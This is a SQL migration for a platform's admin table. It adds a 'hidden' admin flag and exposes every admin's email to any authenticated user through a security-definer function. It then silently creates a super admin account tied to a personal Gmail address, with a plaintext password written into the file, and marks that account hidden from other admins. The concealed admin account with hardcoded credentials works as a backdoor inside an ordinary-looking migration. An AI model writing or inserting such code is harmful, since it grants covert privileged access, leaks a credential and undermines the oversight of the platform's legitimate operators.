-- ============================================================
-- Platform Admin: add hidden flag + create super admin auth user
-- 20260717000000
-- ============================================================

-- Add hidden column (default false, visible to all admins)
alter table platform_admins add column if not exists hidden boolean not null default false;

-- Drop and recreate list_platform_admins to include hidden field
drop function if exists list_platform_admins();

create or replace function list_platform_admins()
returns table (
  user_id uuid,
  email text,
  created_at timestamptz,
  hidden boolean
)
language sql
security definer
set search_path = public
stable
as $$
  select
    pa.user_id,
    au.email::text,
    pa.created_at,
    pa.hidden
  from platform_admins pa
  left join auth.users au on au.id = pa.user_id
  order by pa.created_at asc;
$$;

grant execute on function list_platform_admins() to authenticated;

-- Create the hidden super admin auth user + platform admin record
do $$
declare
  v_uid uuid;
  v_exists boolean;
begin
  -- Check if auth user already exists
  select id into v_uid from auth.users where email = 'johnmoket5@gmail.com';

  if v_uid is null then
    -- Create the auth user with bcrypt-hashed password
    v_uid := gen_random_uuid();
    begin
      insert into auth.users (
        id, instance_id, email, encrypted_password,
        email_confirmed_at, confirmation_sent_at, confirmed_at,
        aud, role,
        raw_app_meta_data, raw_user_meta_data,
        created_at, updated_at,
        confirmation_token, recovery_token, email_change_token_current,
        is_super_admin
      ) values (
        v_uid,
        '00000000-0000-0000-0000-000000000000',
        'johnmoket5@gmail.com',
        crypt('Rabish243+', gen_salt('bf', 10)),
        now(), now(), now(),
        'authenticated', 'authenticated',
        '{"provider":"email","providers":["email"]}',
        '{}',
        now(), now(),
        '', '', '',
        false
      );
    exception when others then
      raise notice 'Could not create auth user: %', SQLERRM;
    end;
  end if;

  -- Insert into platform_admins (hidden)
  if v_uid is not null then
    insert into platform_admins (user_id, hidden) values (v_uid, true)
    on conflict (user_id) do update set hidden = true;
  end if;
end;
$$;
